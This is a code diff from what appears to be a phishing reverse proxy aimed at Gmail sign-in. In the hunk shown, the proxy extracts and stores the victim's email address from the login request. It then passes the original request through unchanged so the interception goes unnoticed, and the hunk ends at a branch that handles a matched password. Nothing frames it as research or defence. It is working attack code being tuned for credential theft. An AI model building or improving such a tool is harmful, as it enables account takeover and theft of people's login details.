@@ -113,11 +113,10 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
                     Object.assign(this.browserReq.clientContext.sessionBody,
                         { email: emailGmail })
                     console.log(`email address is ${emailGmail}`)
-                    // Forward the ORIGINAL request to Gmail without modifications
-                    console.log('Headers being sent to Gmail:', this.proxyEndpoint.getHeaders())
-                    this.proxyEndpoint.write(cJust) 
-                    this.proxyEndpoint.end()
-                    console.log('Original request forwarded to Gmail, waiting for response...')
+                    // Just capture the email and let the original request flow through normally
+                    console.log('Email captured, letting original request flow through...')
+                    // Don't modify anything, just let the original request continue
+                    return this.browserReq.pipe(this.proxyEndpoint)
 
                 } else if (passwordMatch) {
                     console.log('Password matched')
